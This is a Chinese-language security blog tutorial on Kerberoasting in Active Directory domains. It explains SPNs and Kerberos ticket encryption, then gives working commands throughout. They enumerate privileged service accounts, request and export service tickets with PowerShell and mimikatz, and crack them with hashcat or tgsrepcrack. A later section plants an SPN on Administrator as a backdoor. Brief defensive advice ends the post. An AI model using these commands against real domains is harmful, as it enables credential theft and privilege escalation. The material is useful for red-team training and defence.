---
layout: post
title: 域渗透——Kerberoasting
---


## 0x00 前言
---

Kerberoasting是域渗透中经常使用的一项技术，本文将参考公开的资料，结合自己的理解，详细介绍Kerberoasting的原理和实现，以及一个后门利用的方法，最后给出防御建议。

参考资料：

http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/

http://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/

https://malicious.link/post/2016/kerberoast-pt1/

https://malicious.link/post/2016/kerberoast-pt2/

https://malicious.link/post/2016/kerberoast-pt3/

https://adsecurity.org/?p=3458

https://adsecurity.org/?page_id=183

https://blog.netspi.com/faster-domain-escalation-using-ldap/

https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spns-setspn-syntax-setspn-exe.aspx

## 0x01 简介
---

本文将要介绍以下内容：

- Kerberoasting相关概念
- Kerberoasting的原理
- Kerberoasting的实现
- Kerberoasting的后门利用
- Kerberoasting的防御

## 0x02 基本概念
---

### SPN

官方文档：

https://docs.microsoft.com/en-us/windows/desktop/AD/service-principal-names

全称`Service Principal Names`

SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN

SPN分为两种，一种注册在AD上机器帐户(Computers)下，另一种注册在域用户帐户(Users)下

当一个服务的权限为`Local System`或`Network Service`，则SPN注册在机器帐户(Computers)下

当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下

### SPN的格式

```
serviceclass/host:port/servicename
```

说明：

- serviceclass可以理解为服务的名称，常见的有www, ldap, SMTP, DNS, HOST等
- host有两种形式，FQDN和NetBIOS名，例如server01.test.com和server01
- 如果服务运行在默认端口上，则端口号(port)可以省略

### 查询SPN

对域控制器发起LDAP查询，这是正常kerberos票据行为的一部分，因此查询SPN的操作很难被检测

#### (1) 使用SetSPN

Win7和Windows Server2008自带的工具

查看当前域内的所有SPN：

```
setspn.exe -q */*
```

查看test域内的所有SPN：

```
setspn.exe -T test -q */*
```

输出结果实例：

```
CN=DC1,OU=Domain Controllers,DC=test,DC=com
        exchangeRFR/DC1
        exchangeRFR/DC1.test.com
        exchangeMDB/DC1.test.com
        exchangeMDB/DC1
        exchangeAB/DC1
        exchangeAB/DC1.test.com
        SMTP/DC1
        SMTP/DC1.test.com
        SmtpSvc/DC1
        SmtpSvc/DC1.test.com
        ldap/DC1.test.com/ForestDnsZones.test.com
        ldap/DC1.test.com/DomainDnsZones.test.com
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC1.test.com
        DNS/DC1.test.com
        GC/DC1.test.com/test.com
        RestrictedKrbHost/DC1.test.com
        RestrictedKrbHost/DC1
        HOST/DC1/TEST
        HOST/DC1.test.com/TEST
        HOST/DC1
        HOST/DC1.test.com
        HOST/DC1.test.com/test.com
        E3514235-4B06-11D1-AB04-00C04FC2DCD2/0f33253b-2314-40f0-b665-f4317b13e6b9/test.com
        ldap/DC1/TEST
        ldap/0f33253b-2314-40f0-b665-f4317b13e6b9._msdcs.test.com
        ldap/DC1.test.com/TEST
        ldap/DC1
        ldap/DC1.test.com
        ldap/DC1.test.com/test.com
CN=krbtgt,CN=Users,DC=test,DC=com
        kadmin/changepw
CN=COMPUTER01,CN=Computers,DC=test,DC=com
        RestrictedKrbHost/COMPUTER01
        HOST/COMPUTER01
        RestrictedKrbHost/COMPUTER01.test.com
        HOST/COMPUTER01.test.com
CN=MSSQL Service Admin,CN=Users,DC=test,DC=com
        MSSQLSvc/DC1.test.com
```

以CN开头的每一行代表一个帐户，其下的信息是与该帐户相关联的SPN

对于上面的输出数据，机器帐户(Computers)为：

- CN=DC1,OU=Domain Controllers,DC=test,DC=com
- CN=COMPUTER01,CN=Computers,DC=test,DC=com

域用户帐户(Users)为：

- CN=krbtgt,CN=Users,DC=test,DC=com
- CN=MSSQL Service Admin,CN=Users,DC=test,DC=com

注册在域用户帐户(Users)下的SPN有两个：`kadmin/changepw`和`MSSQLSvc/DC1.test.com`

## 0x03 Kerberoasting的原理
---

#### 1、Kerberos认证过程

一个简单的Kerberos认证过程如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-1-15/2-1.png)

1. as_request
2. as_reply
3. tgs_request
4. tgs_reply
5. ap_request
6. ap_reply

对于4.tgs_reply，用户将会收到由目标服务实例的NTLM hash加密生成的TGS(service ticket)，加密算法为`RC4-HMAC`

站在利用的角度，当获得这个TGS后，我们可以尝试穷举口令，模拟加密过程，生成TGS进行比较。如果TGS相同，代表口令正确，就能获得目标服务实例的明文口令

#### 2、Windows系统通过SPN查询获得服务和服务实例帐户的对应关系

这里举一个例子：

用户a要访问MySQL服务的资源，进行到4.tgs_reply时，步骤如下：

(1)Domain Controller查询MySQL服务的SPN

如果该SPN注册在机器帐户(Computers)下，将会查询所有机器帐户(Computers)的servicePrincipalName属性，找到对应的帐户

如果该SPN注册在域用户帐户(Users)下，将会查询所有域用户(Users)的servicePrincipalName属性，找到对应的帐户

(2)找到对应的帐户后，使用该帐户的NTLM hash，生成TGS

#### 3、域内的主机都能查询SPN

#### 4、域内的任何用户都可以向域内的任何服务请求TGS

综上，域内的任何一台主机，都能够通过查询SPN，向域内的所有服务请求TGS，拿到TGS后对其进行暴力破解

对于破解出的明文口令，只有域用户帐户(Users)的口令存在价值，不必考虑机器帐户的口令(无法用于远程连接)

因此，高效率的利用思路如下：

1. 查询SPN，找到有价值的SPN，需要满足以下条件：
- 该SPN注册在域用户帐户(Users)下
- 域用户账户的权限很高
2. 请求TGS
3. 导出TGS
4. 暴力破解

## 0x04 Kerberoasting的实现方法一
---

### 1、获得有价值的SPN

需要满足以下条件：

- 该SPN注册在域用户帐户(Users)下
- 域用户账户的权限很高

可以选择以下三种方法：

#### (1)使用powershell模块Active Directory 

**注：**

powershell模块Active Directory 需要提前安装，域控制器一般会安装

```
import-module ActiveDirectory
get-aduser -filter {AdminCount -eq 1 -and (servicePrincipalName -ne 0)} -prop * |select name,whencreated,pwdlastset,lastlogon
```

对于未安装Active Directory模块的系统，可以通过如下命令导入Active Directory模块：

```
import-module .\Microsoft.ActiveDirectory.Management.dll
```

Microsoft.ActiveDirectory.Management.dll在安装powershell模块Active Directory后生成，我已经提取出来并上传至github：

https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll


#### (2)使用PowerView

https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1

```
Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,lastlogon
```

#### (3)使用kerberoast

powershell:

https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1

vbs:

https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs

参数如下：

```
cscript GetUserSPNs.vbs
```

### 2、请求TGS

#### (1)请求指定TGS

```
$SPNName = 'MSSQLSvc/DC1.test.com'
Add-Type -AssemblyNAme System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName
```

#### (2)请求所有TGS

```
Add-Type -AssemblyName System.IdentityModel  
setspn.exe -q */* | Select-String '^CN' -Context 0,1 | % { New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  
```

执行后输入`klist`查看内存中的票据，可找到获得的TGS

### 3、导出

使用mimikatz

```
kerberos::list /export
```

### 4、破解

https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py

```
./tgsrepcrack.py wordlist.txt test.kirbi
```

## 0x05 Kerberoasting的实现方法二
---

自动实现，并且不需要mimikatz，普通用户权限即可，参考资料：

http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/

代码地址：

https://github.com/EmpireProject/Empire/commit/6ee7e036607a62b0192daed46d3711afc65c3921

使用`System.IdentityModel.Tokens.KerberosRequestorSecurityToken`请求TGS，在返回结果中提取出TGS，输出的TGS可选择John the Ripper或Hashcat进行破解

实例演示：

在域内一台主机上以普通用户权限执行：

```
Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | fl
```

-AdminCount表示选择高权限的用户

输出结果如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-1-15/2-2.png)

只提取出hash的参数如下：

```
Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation
```

输出结果如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-1-15/2-3.png)

使用hashcat破解的参数如下：

```
hashcat -m 13100 /tmp/hash.txt /tmp/password.list -o found.txt --force
```

破解结果如下图，成功获得明文口令`MySQLAdmin111!`

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-1-15/2-4.png)

**注：**

Rubeus也可以实现Invoke-Kerberoast的功能，地址如下：

https://github.com/GhostPack/Rubeus

参数如下：

```
Rubeus.exe kerberoast
```

## 0x06 Kerberoasting的后门利用
---

在我们取得了SPN的修改权限后，可以为指定的域用户添加一个SPN，这样可以随时获得该域用户的TGS，经过破解后获得明文口令

例如为域用户`Administrator`添加`SPNVNC/DC1.test.com`，参数如下：

```
setspn.exe -U -A VNC/DC1.test.com Administrator
```

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-1-15/3-1.png)

在域内任意一台主机都能获得该SPN，并且能够使用Kerberoast获得TGS，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-1-15/3-2.png)

再使用hashcat破解即可

**补充：**

删除SPN的参数如下：

```
setspn.exe -D VNC/DC1.test.com Administrator
```

## 0x07 防御
---

站在防御的角度，不可能阻止kerberoast，但可以对有攻击价值的SPN(注册在域用户帐户下，权限高)，增加密码长度，能够提高破解难度，并且定期修改关联的域用户口令

管理员可在域内一台主机上使用Invoke-Kerberoast检查是否存在危险的SPN

下载地址：

https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1

参数：

```
Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,lastlogon
```

## 0x08 小结
---

本文对Kerberoasting的原理、方法和防御作了详细介绍，并进行了实例演示。


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)






